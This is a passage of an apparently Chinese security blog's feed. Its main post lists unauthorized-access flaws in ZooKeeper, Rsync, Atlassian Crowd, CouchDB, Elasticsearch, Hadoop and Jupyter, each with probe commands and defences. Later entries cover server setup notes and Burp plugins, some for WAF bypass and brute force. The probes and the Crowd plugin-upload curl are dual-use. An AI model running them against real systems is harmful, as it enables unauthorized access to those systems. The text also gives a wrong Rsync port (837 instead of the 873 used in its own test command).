zookeeper是分布式协同管理工具，常用来管理系统配置信息，提供分布式协同服务。Zookeeper的默认开放端口是2181。Zookeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令。<br><strong>测试</strong><br>echo envi|nc 10.0.0.1 2181</p><p>利用zookeeper可视化管理工具进行连接，下载地址：<a href="https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip">https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip</a></p><p><strong>防御手段</strong></p><ul><li>修改 ZooKeeper 默认端口，采用其他端口服务。</li><li>添加访问控制，配置服务来源地址限制策略。</li><li>增加 ZooKeeper 的认证配置。</li></ul><h3 id="Rsync-未授权访问漏洞"><a href="#Rsync-未授权访问漏洞" class="headerlink" title="Rsync 未授权访问漏洞"></a>Rsync 未授权访问漏洞</h3><p><strong>漏洞简介以及危害</strong></p><p>  Rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。Rsync 默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。Rsync 的默认端口为 837。</p><p><strong>测试</strong><br>rsync rsync://10.0.0.1:873/</p><p>rsync 10.0.0.1::</p><p><strong>防御手段</strong></p><ul><li>账户认证：正确配置认证用户名及密码。</li><li>权限控制：使用合理的权限。</li><li>网络访问控制：控制接入源ip。</li><li>数据加密传输等</li></ul><h3 id="Atlassian-Crowd-未授权访问漏洞"><a href="#Atlassian-Crowd-未授权访问漏洞" class="headerlink" title="Atlassian Crowd 未授权访问漏洞"></a>Atlassian Crowd 未授权访问漏洞</h3><p><strong>漏洞简介以及危害</strong></p><p>  Atlassian Crowd和Atlassian Crowd Data Center都是澳大利亚Atlassian公司的产品。Atlassian Crowd是一套基于Web的单点登录系统。该系统为多用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了pdkinstall开发插件，使其存在安全漏洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件，执行任意代码/命令，从而获得服务器权限。</p><p><strong>测试</strong><br>进行上传一个标准的插件，来自atlassian-bundled-plugins中的applinks-plugin-5.4.12.jar</p><p>curl –form “file_cdl=@applinks-plugin-5.4.12.jar” <a href="http://10.0.0.1:8095/crowd/admin/uploadplugin.action">http://10.0.0.1:8095/crowd/admin/uploadplugin.action</a> -v</p><p><strong>防御手段</strong></p><ul><li>设置访问/crowd/admin/uploadplugin.action的源ip。</li><li>升级最新版本(3.5.0以上)。</li></ul><h3 id="CouchDB-未授权访问漏洞"><a href="#CouchDB-未授权访问漏洞" class="headerlink" title="CouchDB 未授权访问漏洞"></a>CouchDB 未授权访问漏洞</h3><p><strong>漏洞简介以及危害</strong></p><p>  Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）,默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。</p><p>  在官方配置文档中对HTTP Server的配置有WWW-Authenticate：Set this option to trigger basic-auth popup on unauthorized requests，但是很多用户都没有这么配置，导致漏洞产生。</p><p><strong>测试</strong><br>curl <a href="http://10.0.0.1:5984/">http://10.0.0.1:5984</a></p><p>curl <a href="http://10.0.0.1:5984/_config">http://10.0.0.1:5984/_config</a></p><p>nmap -p 5984 –script “couchdb-stats.nse” 10.0.0.1</p><p><strong>防御手段</strong></p><ul><li>绑定指定ip。</li><li>设置访问密码。</li></ul><h3 id="Elasticsearch-未授权访问漏洞"><a href="#Elasticsearch-未授权访问漏洞" class="headerlink" title="Elasticsearch 未授权访问漏洞"></a>Elasticsearch 未授权访问漏洞</h3><p><strong>漏洞简介以及危害</strong></p><p>  ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。Elasticsearch的增删改查操作全部由http接口完成。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索。<br>  Elasticsearch服务普遍存在一个未授权访问的问题，攻击者通常可以请求一个开放9200或9300的服务器进行恶意攻击。</p><p><strong>测试</strong><br>curl <a href="http://10.0.0.1:9200/_nodes">http://10.0.0.1:9200/_nodes</a> #查看节点数据</p><p><strong>防御手段</strong></p><ul><li>访问控制策略，限制IP访问，绑定固定IP。</li><li>架设nginx反向代理服务器，并设置http basic认证来实现elasticsearch的登录认证。 </li><li>在config/elasticsearch.yml中为9200端口设置认证等。</li></ul><h3 id="Hadoop-未授权访问漏洞"><a href="#Hadoop-未授权访问漏洞" class="headerlink" title="Hadoop 未授权访问漏洞"></a>Hadoop 未授权访问漏洞</h3><p><strong>漏洞简介以及危害</strong></p><p>  Hadoop是一个由Apache基金会所开发的分布式系统基础架构，由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web 端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。</p><p><strong>测试</strong><br>访问 <a href="http://10.0.0.1:8088/cluster">http://10.0.0.1:8088/cluster</a></p><p><strong>防御手段</strong></p><ul><li>如无必要，关闭 Hadoop Web 管理页面。</li><li>开启身份验证，防止未经授权用户访问。</li><li>部署Knox、Nginx之类的反向代理系统，防止未经授权用户访问； </li><li>设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问包括 50070 以及 WebUI 等相关端口。<h3 id="Jupyter-Notebook-未授权访问漏洞"><a href="#Jupyter-Notebook-未授权访问漏洞" class="headerlink" title="Jupyter Notebook 未授权访问漏洞"></a>Jupyter Notebook 未授权访问漏洞</h3></li></ul><p><strong>漏洞简介以及危害</strong></p><p>  Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。<br>如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。<br><strong>测试</strong><br>访问 <a href="http://10.0.0.1:8888/">http://10.0.0.1:8888</a></p><p><strong>防御手段</strong></p><ul><li>开启身份验证，防止未经授权用户访问。</li><li>访问控制策略，限制IP访问，绑定固定IP。</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;最近在对公司的资产进行梳理，发现了很多端口对外开放了，如ldap389、rsync873、ssh22、mysql3306和一些不常见的端口，以及内网大量的hadoop、redis、ftp、mongodb等存在未授权访问，从网上收集了一些文章总结一下常见的未授权访问漏洞&lt;/p&gt;</summary>
    
    
    
    <category term="note" scheme="http://www.pa55w0rd.online/categories/note/"/>
    
    
    <category term="未授权访问" scheme="http://www.pa55w0rd.online/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
  </entry>
  
  <entry>
    <title>记录</title>
    <link href="http://www.pa55w0rd.online/note/"/>
    <id>http://www.pa55w0rd.online/note/</id>
    <published>2019-08-10T02:53:39.000Z</published>
    <updated>2019-11-19T06:00:35.884Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Centos-7-安装nmap-7-8"><a href="#Centos-7-安装nmap-7-8" class="headerlink" title="Centos 7 安装nmap 7.8"></a>Centos 7 安装nmap 7.8</h2><p>yum直接安装nmap为6.40版本，新版nmap为7.8</p><p>yum info nmap</p><p>直接使用rpm包安装最新版</p><p><a href="https://nmap.org/dist/">https://nmap.org/dist/</a> 下载</p><p>rpm -vhU <a href="https://nmap.org/dist/nmap-7.80-1.x86_64.rpm">https://nmap.org/dist/nmap-7.80-1.x86_64.rpm</a></p><h2 id="centos-7-安装-mysql-8"><a href="#centos-7-安装-mysql-8" class="headerlink" title="centos 7 安装 mysql 8"></a>centos 7 安装 mysql 8</h2><p>下载mysql repo源并安装</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -Uvh http:<span class="regexp">//</span>dev.mysql.com<span class="regexp">/get/my</span>sql57-community-release-el7-<span class="number">9</span>.noarch.rpm</span><br></pre></td></tr></table></figure><p>查看可用的mysql版本</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum repolist <span class="keyword">all</span> | <span class="keyword">grep</span> mysql</span><br></pre></td></tr></table></figure><p>修改源文件,禁用5.7,启用8.0</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vi <span class="regexp">/etc/yum</span>.repos.d/mysql-community.repo</span><br></pre></td></tr></table></figure><p>把里面的8.0enabled改为1就可以了，其他的版本改为0</p><p>修改完之后查看可用版本</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yum repolist enabled | grep mysql </span></span><br><span class="line"><span class="attribute">mysql</span>-connectors-community/x<span class="number">86</span>_<span class="number">64</span> MySQL Connectors Community                 <span class="number">131</span></span><br><span class="line"><span class="attribute">mysql</span>-tools-community/x<span class="number">86</span>_<span class="number">64</span>      MySQL Tools Community                      <span class="number">100</span></span><br><span class="line"><span class="attribute">mysql80</span>-community/x<span class="number">86</span>_<span class="number">64</span>          MySQL <span class="number">8</span>.<span class="number">0</span> Community Server                 <span class="number">145</span></span><br></pre></td></tr></table></figure><p>8.0版本启用后,安装Mysql</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y mysql-community-<span class="keyword">server</span></span><br></pre></td></tr></table></figure><p>启动，开机启动</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="keyword">start</span> mysqld</span><br><span class="line">systemctl <span class="keyword">enable</span> mysqld</span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><p>查看随机生成的密码,注意记住密码</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grep</span> <span class="string">&#x27;temporary password&#x27;</span> <span class="regexp">/var/</span>log/mysqld.log</span><br></pre></td></tr></table></figure><p>修改root密码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;password&#x27;</span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Centos-7-安装nmap-7-8&quot;&gt;&lt;a href=&quot;#Centos-7-安装nmap-7-8&quot; class=&quot;headerlink&quot; title=&quot;Centos 7 安装nmap 7.8&quot;&gt;&lt;/a&gt;Centos 7 安装nmap 7.8&lt;/h2&gt;&lt;p&gt;yu</summary>
      
    
    
    
    <category term="note" scheme="http://www.pa55w0rd.online/categories/note/"/>
    
    
    <category term="基础" scheme="http://www.pa55w0rd.online/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>proxychains_error</title>
    <link href="http://www.pa55w0rd.online/proxychains-error/"/>
    <id>http://www.pa55w0rd.online/proxychains-error/</id>
    <published>2019-07-22T07:52:35.000Z</published>
    <updated>2019-07-22T07:59:45.542Z</updated>
    
    <content type="html"><![CDATA[<p>在使用proxychains代理时，报了个错误</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ProxyChains<span class="string">-3</span>.1 (http://proxychains.sf.net)</span><br><span class="line"><span class="keyword">ERROR: </span>ld.so: object &#x27;libproxychains.so.3&#x27; from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.</span><br></pre></td></tr></table></figure><span id="more"></span><p>看来proxychains无法加载libproxychains.so.3库，查到的资料是修改/usr/bin/proxychains文件的export</p><p>通过find命令查找这个库</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">find</span> <span class="regexp">/usr/</span> -name libproxychains.so.<span class="number">3</span> -<span class="keyword">print</span></span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/x86_64-linux-gnu/</span>libproxychains.so.<span class="number">3</span></span><br></pre></td></tr></table></figure><p>将vi /usr/bin/proxychains的export修改为/usr/lib/x86_64-linux-gnu/libproxychains.so.3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ProxyChains-3.1 (http://proxychains.sf.net)&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> = 0 ] ; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;  usage:&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;          proxychains &lt;prog&gt; [args]&quot;</span></span><br><span class="line">        <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">export</span> LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libproxychains.so.3</span><br><span class="line"><span class="built_in">exec</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;在使用proxychains代理时，报了个错误&lt;/p&gt;
&lt;figure class=&quot;highlight subunit&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ProxyChains&lt;span class=&quot;string&quot;&gt;-3&lt;/span&gt;.1 (http://proxychains.sf.net)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;ERROR: &lt;/span&gt;ld.so: object &amp;#x27;libproxychains.so.3&amp;#x27; from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="note" scheme="http://www.pa55w0rd.online/categories/note/"/>
    
    
    <category term="note" scheme="http://www.pa55w0rd.online/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>Burp插件</title>
    <link href="http://www.pa55w0rd.online/burp-plugins/"/>
    <id>http://www.pa55w0rd.online/burp-plugins/</id>
    <published>2019-07-22T06:19:06.000Z</published>
    <updated>2021-08-11T06:04:41.286Z</updated>
    
    <content type="html"><![CDATA[<p>burp中除了BApp Store，还有很多好用的第三方插件，这里手机了一些比较好用也是我自己使用的插件，也欢迎留言推荐其他好用的插件以及burp使用的技巧</p><p>burp的一些技巧请参考<a href="https://www.pa55w0rd.online/burp/">Burp Suite使用中的一些技巧</a></p><span id="more"></span><ul><li><a href="https://github.com/d3vilbug/HackBar">HackBar </a>，火狐的hackbar插件收费了，几个替代品都不怎么好用，这个插件功能比火狐的多且强大</li><li><a href="https://github.com/bit4woo/reCAPTCHA">reCAPTCHA</a>自动识别图形验证码并用于burp intruder爆破模块的插件</li><li><a href="https://github.com/bit4woo/knife">knife</a>增加了几个右键菜单，更新cookie、更新header，集成hackbar、sqlmap、u2c（将unicode转换成中文）</li><li><a href="https://github.com/bit4woo/domain_hunter">domain_hunter</a> 域名收集</li><li><a href="https://github.com/c0ny1/HTTPHeadModifer">HTTPHeadModifer</a>修改header头，伪造源IP、UA、添加Origin、更新cookie</li><li><a href="https://github.com/c0ny1/chunked-coding-converter">chunked-coding-converter</a>  安全客有一篇文章<a href="https://www.anquanke.com/post/id/169738">《利用分块传输吊打所有WAF》</a></li><li><a href="https://github.com/c0ny1/jsEncrypter">jsEncrypter</a>加密传输爆破</li><li><a href="https://github.com/bit4woo/knife">knife</a> 添加一些右键菜单，可自定义</li><li><a href="https://github.com/bit4woo/domain_hunter_pro">domain_hunter_pro</a> domain_hunter的高级版本，SRC挖洞、HW打点之必备！自动化资产收集；快速Title获取；外部工具联动；等等</li><li>SSL Scanner  证书相关</li><li>JSON Web Tokens   jwt相关</li><li>Auth Analyzer  测试越权工具</li><li><a href="https://github.com/pmiaowu/BurpFastJsonScan">BurpFastJsonScan</a> 一款基于BurpSuite的被动式FastJson检测插件，捡到了CSDN的fastjson漏洞</li><li><a href="https://github.com/pmiaowu/BurpShiroPassiveScan">BurpShiroPassiveScan</a> 一款基于BurpSuite的被动式shiro检测插件</li><li><a href="https://github.com/d3vilbug/HackBar">HackBar</a> 火狐的hackbar插件，这个功能更强大</li><li><a href="https://github.com/gh0stkey/HaE">HaE</a>  敏感信息高亮插件，配合<a href="https://gh0st.cn/HaE/">https://gh0st.cn/HaE/</a> 规则</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;burp中除了BApp Store，还有很多好用的第三方插件，这里手机了一些比较好用也是我自己使用的插件，也欢迎留言推荐其他好用的插件以及burp使用的技巧&lt;/p&gt;
&lt;p&gt;burp的一些技巧请参考&lt;a href=&quot;https://www.pa55w0rd.online/burp/&quot;&gt;Burp Suite使用中的一些技巧&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="note" scheme="http://www.pa55w0rd.online/categories/note/"/>
    
    
    <category term="note" scheme="http://www.pa55w0rd.online/tags/note/"/>
    
  </entry>
  
</feed>
